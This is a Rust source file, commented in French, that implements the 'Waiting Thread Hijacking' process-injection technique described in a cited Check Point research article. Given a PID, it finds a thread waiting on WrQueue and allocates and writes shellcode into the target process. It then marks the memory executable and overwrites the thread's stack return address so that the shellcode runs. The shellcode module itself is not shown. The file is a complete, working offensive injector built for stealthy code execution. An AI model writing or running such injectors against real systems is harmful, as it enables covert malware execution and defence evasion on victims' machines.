    //https://research.checkpoint.com/2025/waiting-thread-hijacking/
    /*
    Steps : 
        Exécution: 
            - usage : ./waiting_thread_hijacking.exe [PID]
        Lire NtQuerySystemInformation 
            - Trouver le PID dans SystemProcessInformation de NtQuerySystemInformation 
            - Si on le trouve :
                - Trouver un thread avec ThreadState qui a la valeur WrQueue  
            - Injecter notre shellcode 
            - S'assurer du Happy Ending ;) 
    */

use std::collections::HashMap;
use std::task::Context;
use std::{env, slice};
use std::ptr::null_mut;
use std::fmt::{self, Display};
use ntapi::ntzwapi::ZwWriteVirtualMemory;
use winapi::shared::ntdef::*;
use winapi::shared::minwindef::{DWORD, HMODULE};
use winapi::shared::ntstatus::*;
use winapi::shared::minwindef::FALSE;
use winapi::um::handleapi::CloseHandle;
use winapi::um::libloaderapi::GetModuleHandleExA;
use winapi::um::processthreadsapi::{self, GetThreadContext, OpenProcess, OpenThread};
use winapi::ctypes::c_void;
use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
use ntapi::ntexapi::*;

impl std::error::Error for Error {}

mod shellcode;
use shellcode::SHELLCODE;
use winapi::um::winnt::{CONTEXT, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_GET_CONTEXT};

#[derive(Debug)]
pub enum Error {
    /// Code NTSTATUS retourné par un appel Nt* (< 0 signifie échec).
    Nt(NTSTATUS),
    NotFound(u32), // on conserve le PID pour le contexte si besoina
    OpenHandle(HANDLE),
    OpenHandleWriting(HANDLE),
    OpenThread(HANDLE,DWORD),
    ThreadExtendedInfo(DWORD),
    GetThreadContextFailed(DWORD),
    ReadRetPtr(u64),
    RetPtrNotIn(u64),
    ErrorInjection(),
}

impl From<NTSTATUS> for Error {
    fn from(status: NTSTATUS) -> Self {
        Self::Nt(status)
    }
}

impl Display for Error {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Error::Nt(code) => write!(f, "[!] Échec NTSTATUS = 0x{:X}", *code as u32),
            Error::NotFound(pid) => write!(f, "[!] Processus PID={} non trouvé", pid),
            Error::OpenHandle(handle) => write!(f,"[!] Impossible d'ouvrir un Handle vers le PID donné"),
            Error::OpenHandleWriting(handle) => write!(f, "[!] Impossible d'ouvrir le handle en écriture"),
            Error::OpenThread(handle,tid) => write !(f, "[!] Impossible d'ouvrir le thread {:?}, {tid}",handle),
            Error::ThreadExtendedInfo(tid) => write!(f,"[!] Le thread {tid} manque l'extended info"),
            Error::GetThreadContextFailed(tid) => write!(f,"[!] GetThreadContext a failed {tid}"),
            Error::ReadRetPtr(rsp) => write!(f,"[!] Erreur lors de la lecture du return pointer {:x}",rsp),
            Error::RetPtrNotIn(retptr)=> write!(f,"[!] Pointeur de retour  {:x} pas dans ntdll/kernelbase/kernel32",retptr),
            Error::ErrorInjection()=> write!(f,"[!] Erreur lors de l'injection"),
        }
    }
}

struct ThreadInfo{
    tid:DWORD,
    start_addr:u64,
    is_extended:bool,
    ext: ThreadInfoExt,
}
struct ThreadInfoExt {
    sys_start_addr: u64,
    state: u32,
    wait_reason: u32,
    wait_time: u32,
}

fn get_process_thread(pid:DWORD,threads_info:& mut HashMap<DWORD,ThreadInfo>)-> Result<(),Error >{ //Ou Error ?
    unsafe {
        let mut buffer_size:ULONG = 0;
        let status_first = NtQuerySystemInformation(
            SystemProcessInformation, 
            null_mut(), 
            0, 
            &mut buffer_size);
        
        if status_first != STATUS_INFO_LENGTH_MISMATCH as NTSTATUS {
            return Err(status_first.into());
        }
        let mut buffer:Vec<u8> = Vec::with_capacity(buffer_size as usize); 
        
        let sys_info = NtQuerySystemInformation(
            SystemProcessInformation,
            buffer.as_mut_ptr() as PVOID,
            buffer_size, 
            &mut buffer_size);
        if !NT_SUCCESS(sys_info){
            return Err(sys_info.into());
        }
        let mut sys_procces_info = buffer.as_mut_ptr() as *const SYSTEM_PROCESS_INFORMATION;
        let mut found = false;
        while !sys_procces_info.is_null(){
            if (*sys_procces_info).UniqueProcessId as u32 == pid {
                found = true;
                break;
            }
            if (*sys_procces_info).NextEntryOffset == 0 {
                break;
            }
            sys_procces_info = (sys_procces_info as usize + (*sys_procces_info).NextEntryOffset as usize) as *const SYSTEM_PROCESS_INFORMATION;  
        }
        if !found{
            return Err(Error::NotFound(pid))
        }
        let thread_count = (*sys_procces_info).NumberOfThreads as usize;
         // &(*ptr).Threads pointe sur le premier SYSTEM_THREAD_INFORMATION
        let threads_ptr = &(*sys_procces_info).Threads as *const SYSTEM_THREAD_INFORMATION;
        let threads_slice: &[SYSTEM_THREAD_INFORMATION] = slice::from_raw_parts(threads_ptr, thread_count);
        for ti in threads_slice {
            let tid = ti.ClientId.UniqueThread as DWORD;
            let state = ti.ThreadState;
            let raison = ti.WaitReason;
            //https://learn.microsoft.com/en-us/windows/win32/cimwin32prov/win32-thread
            // Etat 5 = Waiting Thread Reason 15 : WrQueue, c'est ce qu'on veut
            println!("[*] Thread TID={tid}  Etat={state} Raison={raison}");
            
            let thread_info = ThreadInfo{
                tid : tid,
                start_addr : 0,
                is_extended : true,
                ext : ThreadInfoExt { 
                    sys_start_addr: ti.StartAddress as u64,
                    state: state,
                    wait_reason: raison,
                    wait_time: ti.WaitTime 
                }
            };
            threads_info.insert(tid, thread_info);
        }
    }       
    Ok(())
}

fn allocate_shellcode_memory(pid:DWORD)->Result<PVOID,Error>{
    unsafe {
        let handle = OpenProcess( PROCESS_VM_OPERATION, FALSE,pid);
        if handle.is_null() {
            return Err(Error::OpenHandle(handle));
        }
        let p_shellcode = VirtualAllocEx(handle,null_mut(),SHELLCODE.len(),MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
        CloseHandle(handle);
        Ok(p_shellcode)
    }
}

fn write_shellcode_into_process(pid:DWORD,p_shellcode:PVOID) -> Result<(),Error>{
    unsafe {
        let handle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
        let mut bytes_written:usize = 0;
        let status = WriteProcessMemory(handle, p_shellcode, SHELLCODE.as_ptr() as *const c_void, SHELLCODE.len(), &mut bytes_written);
        CloseHandle(handle);
        if status == 0 || bytes_written != SHELLCODE.len(){
            return Err(Error::OpenHandleWriting(handle));
        }
        println!("[+] {bytes_written} Bytes ont été écrit, Pointeur vers p_shellcode {:x}", p_shellcode as u64);
        Ok(())
    }
    
}


fn check_ret_target(ret: u64) -> bool {
    unsafe {
        let mut mod_handle: HMODULE = null_mut();
        // GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS et GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT
        let result = GetModuleHandleExA(0x4 | 0x2, ret as *const i8,&mut mod_handle,);
        if result == 0 {
            println!("[*] Pointeur de retour {:x} reconnu dans aucun module", ret);
            return false
        }

        let ntdll =GetModuleHandleExA(0, "ntdll.dll\0".as_ptr() as *const i8, &mut mod_handle) != 0;
        let kernelbase =GetModuleHandleExA(0, "kernelbase.dll\0".as_ptr() as *const i8, &mut mod_handle) != 0;
        let kernel32 =GetModuleHandleExA(0, "kernel32.dll\0".as_ptr() as *const i8, &mut mod_handle) != 0;

        if ntdll || kernelbase || kernel32 {
            println!("[*] Pointeur de retour {:x} valide (ntdll/kernelbase/kernel32)",ret);
            return true
        } else {
            return false
        }
    }
}

fn read_context(tid: DWORD, ctx: &mut CONTEXT) -> Result<(),Error> {
    unsafe {
        let h_thread = OpenThread(THREAD_GET_CONTEXT, FALSE, tid);
        if h_thread.is_null() {
            return Err(Error::OpenThread(h_thread,tid))
        }

        ctx.ContextFlags = winapi::um::winnt::CONTEXT_INTEGER | winapi::um::winnt::CONTEXT_CONTROL;
        let result = GetThreadContext(h_thread, ctx);
        CloseHandle(h_thread);
        if result == 0 {
            return Err(Error::GetThreadContextFailed(tid))
        }
        Ok(())
    }
}



fn read_return_ptr<T>(h_process: HANDLE, rsp: u64) -> Option<T> {
    unsafe {
        let mut ret_addr: T = std::mem::zeroed();
        let mut read_size: usize = 0;
        let result = ReadProcessMemory(
            h_process,
            rsp as PVOID,
            &mut ret_addr as *mut _ as PVOID,
            std::mem::size_of::<T>(),
            &mut read_size,
        );
        if NT_SUCCESS(result) && read_size == std::mem::size_of::<T>() {
            Some(ret_addr)
        } else {
            None
        }
    }
}

fn get_suitable_ret_address(pid:DWORD,threads_info:& mut HashMap<DWORD,ThreadInfo>)-> Result<(* mut c_void,u64,u64),Error>{
    unsafe{
        let h_process = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
        if h_process.is_null() {
            return Err(Error::OpenHandle(h_process))
        }
        let mut ctx:CONTEXT = std::mem::zeroed();
        let mut suitable_ret_ptr: u64 = 0;
        let mut suitable_ret: u64 = 0;
        println!("Je vais itérer {}", threads_info.iter().count());
        for (tid, info) in threads_info.iter(){
            if info.is_extended == false{
                return Err(Error::ThreadExtendedInfo(*tid));
            }
            if info.ext.state == 5 {
                println!("[*] Le TID {}: est en état Waiting pour la raison: {}",info.tid,info.ext.wait_reason);
                if info.ext.wait_reason != 15 {
                    continue;
                }
                if let Err(e) = read_context(info.tid, &mut ctx) {
                    println!("[*] Skipping TID {}: impossible de lire le contexte: {}", tid, e);
                    continue;
                }
                if let Some(ret) = read_return_ptr::<u64>(h_process, ctx.Rsp) {
                    println!("[*] TID {}: Addresse de retour: {:x}", info.tid, ret);
                    if suitable_ret_ptr == 0 {
                        if check_ret_target(ret) == false{
                            println!("[*] Cible invalide TID: {}", info.tid);
                            continue;
                        }
                        suitable_ret_ptr = ctx.Rsp;
                        suitable_ret = ret;
                        println!("[+] J'ai trouvé une cible ! TID {}", info.tid);
                        break;
                    }
                }else {
                    return Err(Error::ReadRetPtr(ctx.Rsp))
                }
            }else{
                println!("[*] TID {}: Pas en attente, État: {}",info.tid, info.ext.state);
            }
        }
        Ok((h_process,suitable_ret_ptr,suitable_ret ))
    }
}

fn protect_memory(pid: DWORD, mem_ptr: PVOID, mem_size: usize, protect: DWORD) -> bool {
    unsafe {
        let h_process = OpenProcess(PROCESS_VM_OPERATION, FALSE, pid);
        if h_process.is_null() {
            eprintln!("[-] Impossible d'ouvrir le process {} en memory protection", pid);
            return false;
        }

        let mut old_protect: DWORD = 0;
        let result = VirtualProtectEx(h_process, mem_ptr, mem_size, protect, &mut old_protect);
        CloseHandle(h_process);
        if result == 0 {
            eprintln!("[-] VirtualProtectEx failed pour le pid {}", pid);
            return false;
        }
        println!(
            "[+] Memory protection mise à {:x} pour {:x}",
            protect, mem_ptr as u64
        );
        true
    }
}


fn inject(pid:DWORD, h_process: HANDLE,p_shellcode:PVOID,suitable_ret:u64,suitable_ret_ptr:u64) -> Result<(),Error>{
    unsafe{
        if suitable_ret_ptr != 0 {
            let mut written: usize = 0;
            let result = ZwWriteVirtualMemory(
                h_process,
                p_shellcode as PVOID,
                &suitable_ret as *const _ as PVOID,
                std::mem::size_of::<u64>(),
                &mut written,
            );
            if !NT_SUCCESS(result) || written != std::mem::size_of::<u64>() {
                eprintln!(
                    "[-] Impossible d'écrire l'adresse de retour dans le shellcode : {:x}",
                    result
                );
                CloseHandle(h_process);
                return Err(Error::ErrorInjection());
            }
            println!("[+] On a écrit l'adresse de retour {:x} dans le shellcode", suitable_ret);

            if !protect_memory(
                pid,
                p_shellcode as PVOID,
                SHELLCODE.len(),
                PAGE_EXECUTE_READ,
            ) {
                CloseHandle(h_process);
                return Err(Error::ErrorInjection());
            }

            let new_p_shellcode = ((p_shellcode as usize) + 8) as PVOID;

            println!(
                "[*] Réécriture du stack return : {:x} -> {:x} with {:x}",
                suitable_ret_ptr, suitable_ret, new_p_shellcode as usize
            );
            let result = ZwWriteVirtualMemory(
                h_process,
                suitable_ret_ptr as PVOID,
                &new_p_shellcode as *const _ as PVOID,
                std::mem::size_of::<u64>(),
                &mut written,
            );
            if !NT_SUCCESS(result) || written != std::mem::size_of::<u64>() {
                eprintln!("[-] Impossible de réécrire l'adresse du retour du pointer : {:x}", result);
                CloseHandle(h_process);
                return Err(Error::ErrorInjection());
            }
            println!(
                "[+] On a réécrit le stack pointeur sur {:x}",
                new_p_shellcode as usize
            );
        } else {
            println!("[-] Pas trouvé de thread ok pour l'injection (wait reason: WrQueue)");
        }

        CloseHandle(h_process);
        Ok(())
    }
}


fn run_proccess_injection(pid:DWORD)-> Result<(),Error>{
    let mut threads_info:HashMap<DWORD,ThreadInfo> = HashMap::new();
    let p_shellcode = allocate_shellcode_memory(pid)?;
    write_shellcode_into_process(pid, p_shellcode)?;
    get_process_thread(pid,&mut threads_info)?;
    //Prochaines étapes : Regarder si le thread en WrQueue est compatible avec ce qu'on peut faire ; Overwrite son addresse de retour avec le pointeur vers l'adresse mémoire de notre shellcode
    let (h_process,suitable_ret_ptr, suitable_ret) = get_suitable_ret_address(pid, &mut threads_info)?;
    inject(pid,h_process,p_shellcode,suitable_ret,suitable_ret_ptr)?;
    Ok(())
}


fn main(){
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        eprintln!("[*] Usage: ./waiting_thread_hijacking.exe [PID]");
        return;
    }
    let pid: DWORD = match args[1].parse() {
        Ok(n) if n != 0 => n,
        _ => {
            println!("[*] T'es sérieux ?");
            return;
        }
    };
    match run_proccess_injection(pid){
        Ok(())=>println!("[!] Process Injecté avec succès !"),
        Err(err) => println!("Error : {}",err),
    };
}   
